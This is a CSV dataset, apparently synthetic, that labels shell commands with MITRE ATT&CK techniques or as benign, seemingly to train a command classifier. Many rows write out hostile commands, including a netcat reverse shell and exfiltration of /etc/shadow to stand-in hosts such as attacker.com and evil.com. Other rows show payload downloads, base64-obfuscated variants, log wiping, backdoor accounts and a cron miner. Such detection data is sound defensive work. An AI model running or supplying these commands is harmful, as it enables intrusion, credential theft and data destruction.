command,features,label,source
id -Gn && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ssh admin@localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo  ''  >  /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 ; echo done,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.32, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sed -i 's/old/new/g' config.cfg,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
"bash -c ""service apache2 status""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
time echo 'Y2F0IC9ldGMvcGFzc3dkIHwgYXdrIC1GOiAnJDMgPj0gMTAwMCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cHl0aG9uMyAtYyAiZnJvbSBQSUwgaW1wb3J0IEltYWdlR3JhYjsgSW1hZ2VHcmFiLmdyYWIoKS5zYXZlKCcvdG1wL3MucG5nJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1113_Screen_Capture', 'T1027_Obfuscated_Files_or_Information']",synthetic
nping --icmp 8.8.8.8 --data-hex $(xxd -p /etc/passwd | tr -d '\n'),"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1048_Exfiltration_Over_Alternative_Protocol'],synthetic
echo 'cmVnc3ZyMzIgL3MgL24gL3UgL2k6aHR0cDovL2V2aWwuY29tL2ZpbGUuc2N0IHNjcm9iai5kbGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1218_System_Binary_Proxy_Execution', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""mkdir /tmp/.staging && cp -r /home/*/.ssh /tmp/.staging/""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]",['T1074_Data_Staged'],synthetic
echo  'cm0gLXJmIC90bXAvKiAvdmFyL3RtcC8q'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
Get-ADDefaultDomainPasswordPolicy,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1201_Password_Policy_Discovery'],synthetic
ssh user@192.168.1.10 'ls',"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
"python3 -c ""import ctypes; ctypes.CDLL(None).system('/tmp/shell')""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1055_Process_Injection'],synthetic
cat /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
cat /proc/cpuinfo | grep hypervisor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1497_Virtualization_Sandbox_Evasion'],synthetic
chmod 644 /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"bash -c ""ssh -D 1080 -f -N user@jump.host""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1090_Proxy'],synthetic
unset  HISTFILE;  export  HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
ngrok http 80 --log=stdout | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1219_Remote_Access_Software', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""usermod -aG sudo compromised_user | > /dev/null 2>&1""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y3AgLXIgL2hvbWUvdXNlci8uY29uZmlnL2dvb2dsZS1jaHJvbWUvRGVmYXVsdC9FeHRlbnNpb25zIC90bXAv' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1176_Browser_Extensions', 'T1027_Obfuscated_Files_or_Information']",synthetic
ls  -la  /root  /etc  /var/www  &&  chmod  +x  /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time history -c && history -w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1070_Indicator_Removal'],synthetic
nohup cat /etc/shadow | nc 10.0.0.99 4444 &,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
"python3 -c ""import base64; exec(base64.b64decode('aW1wb3J0IG9z'))""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1140_Deobfuscate_Decode'],synthetic
arp -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"bash -c ""Get-ADDefaultDomainPasswordPolicy""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1201_Password_Policy_Discovery'],synthetic
sox -t alsa default /tmp/recording.wav trim 0 120,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1123_Audio_Capture'],synthetic
nohup crontab -l &,"[0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo 'bm9odXAgLi9uZ3JvayB0Y3AgMjIgJiAmJiBlY2hvIGRvbmU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1219_Remote_Access_Software', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
"bash -c ""ln -s /tmp/backdoor.sh /etc/cron.d/system-update""","[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1053_Scheduled_Task'],synthetic
wmic process call create 'cmd.exe /c whoami',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1047_Windows_Management_Instrumentation'],synthetic
xargs -a /tmp/cmds.txt sh -c,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1202_Indirect_Command_Execution'],synthetic
"time python3 -c ""import base64; print(base64.b64encode(open('/etc/passwd','rb').read()).decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1132_Data_Encoding'],synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""find / -name '*.pem' -exec cp {} /tmp/loot \;""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1074_Data_Staged'],synthetic
cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
time echo 'aGVsbG8gd29ybGQ=' | base64 -d,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1140_Deobfuscate_Decode'],synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
echo 'Y3VybCAtWCBQT1NUIGh0dHA6Ly9ldmlsLmNvbS9jb2xsZWN0IC1kIEAvZXRjL3NoYWRvdw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'bWtkaXIgL3RtcC8uc3RhZ2luZyAmJiBjcCAtciAvaG9tZS8qLy5zc2ggL3RtcC8uc3RhZ2luZy8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1074_Data_Staged', 'T1027_Obfuscated_Files_or_Information']",synthetic
git clone https://github.com/user/repo.git,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
scp file.txt user@host:/tmp/,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
cp -r /home/user/.config/google-chrome/Default/Extensions /tmp/,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1176_Browser_Extensions'],synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
sox  -t  alsa  default  /tmp/recording.wav  trim  0  120  &&  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1123_Audio_Capture', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""cat /etc/group""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
sudo systemd-detect-virt && echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1497_Virtualization_Sandbox_Evasion', 'T1059_Command_and_Scripting_Interpreter']",synthetic
scrot  -u  /tmp/cap.png,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1113_Screen_Capture'],synthetic
"bash -c ""find / -name '*.conf' -readable 2>/dev/null | head -20""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
echo 'd2dldCBodHRwOi8vYXR0YWNrZXIuY29tL3BheWxvYWQgLU8gL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3 -c ""from PIL import ImageGrab; ImageGrab.grab().save('/tmp/s.png')""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1113_Screen_Capture'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
ssh  admin@localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IGN0eXBlczsgY3R5cGVzLkNETEwoTm9uZSkuc3lzdGVtKCcvdG1wL3NoZWxsJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1055_Process_Injection', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""find / -name '*.pem' 2>/dev/null""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IGJhc2U2NDsgcHJpbnQoYmFzZTY0LmI2NGVuY29kZShvcGVuKCcvZXRjL3Bhc3N3ZCcsJ3JiJykucmVhZCgpKS5kZWNvZGUoKSki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1132_Data_Encoding', 'T1027_Obfuscated_Files_or_Information']",synthetic
sqlmap -u 'http://target.com/login?id=1' --dbs --batch,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1190_Exploit_Public_Facing_Application'],synthetic
xargs -a /tmp/cmds.txt sh -c && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 1]","['T1202_Indirect_Command_Execution', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHN1YnByb2Nlc3M7IFtzdWJwcm9jZXNzLnJ1bihsLnN0cmlwKCksc2hlbGw9VHJ1ZSkgZm9yIGwgaW4gb3BlbignL3RtcC9jbWRzJyldIg==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1202_Indirect_Command_Execution', 'T1027_Obfuscated_Files_or_Information']",synthetic
systemctl restart nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
"bash -c ""gcc exploit.c -o exploit && ./exploit""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nping --icmp 8.8.8.8 --data-hex $(xxd -p /etc/passwd | tr -d '\n'),"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1048_Exfiltration_Over_Alternative_Protocol'],synthetic
"python3 -c ""import base64; print(base64.b64encode(open('/etc/passwd','rb').read()).decode())""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1132_Data_Encoding'],synthetic
wmic /node:10.0.0.5 /user:admin process call create 'cmd.exe',"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1047_Windows_Management_Instrumentation'],synthetic
"bash -c ""runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1078_Valid_Accounts'],synthetic
nohup find / -perm -4000 -type f 2>/dev/null &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
pip install requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
cat /proc/version,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1082_System_Information_Discovery'],synthetic
echo  'c3NoIC1pIH4vLnNzaC9zdG9sZW5fa2V5IHJvb3RAMTAuMC4wLjUgfCBlY2hvIGRvbmU='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ping -c 1 -p 4142434445 attacker.com | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1095_Non_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
dnscat2 --secret=mysecret attacker.com && sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1048_Exfiltration_Over_Alternative_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
nohup locate wp-config.php | sleep 1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time echo 'ZmluZCAvaG9tZSAtbmFtZSAnKi5rZGJ4JyAyPi9kZXYvbnVsbA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1005_Data_from_Local_System', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'aHBpbmczIC0taWNtcCAtLWRhdGEgMTAwMCAxMC4wLjAuOTk=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1095_Non_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cHl0aG9uMyAtYyAiZXhlYyhfX2ltcG9ydF9fKCdiYXNlNjQnKS5iNjRkZWNvZGUoJ2FXMXdiM0owSUc5eicpLmRlY29kZSgpKSIgfCA+IC9kZXYvbnVsbCAyPiYx' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1112_Modify_Registry'],synthetic
iodine -f -P password dns.attacker.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1048_Exfiltration_Over_Alternative_Protocol'],synthetic
"bash -c ""echo 'c3VkbyAtdSB3d3ctZGF0YSBiYXNoIDsgZWNobyBkb25l' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'aGVsbG8gd29ybGQ=' | base64 -d,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1140_Deobfuscate_Decode'],synthetic
sudo cat /etc/shadow,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
rsync -av /etc/ /tmp/etc_backup/,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1074_Data_Staged'],synthetic
"bash -c ""echo 'YXJlY29yZCAtZCA2MCAtZiBjZCAvdG1wL2F1ZGlvLndhdiA7IGhpc3RvcnkgLWM=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1123_Audio_Capture', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
find / -name 'wallet.dat' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1005_Data_from_Local_System'],synthetic
sudo bitsadmin /transfer myJob http://attacker.com/payload.exe %TEMP%\payload.exe,"[0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1197_BITS_Jobs'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1 && > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.48, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup gcc exploit.c -o exploit && ./exploit &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
scp file.txt user@host:/tmp/,"[0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
time echo 'cmVnc3ZyMzIgL3MgL24gL3UgL2k6aHR0cDovL2V2aWwuY29tL2ZpbGUuc2N0IHNjcm9iai5kbGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1218_System_Binary_Proxy_Execution', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/hostname,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash' | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 1]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
proxychains nmap -sV 10.0.0.1 | > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0.2, 0.32, 1, 0]","['T1090_Proxy', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'cGluZyAtYyAxIC1wIDQxNDI0MzQ0NDUgYXR0YWNrZXIuY29t' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1095_Non_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
su  -  admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
time id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
top -bn1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
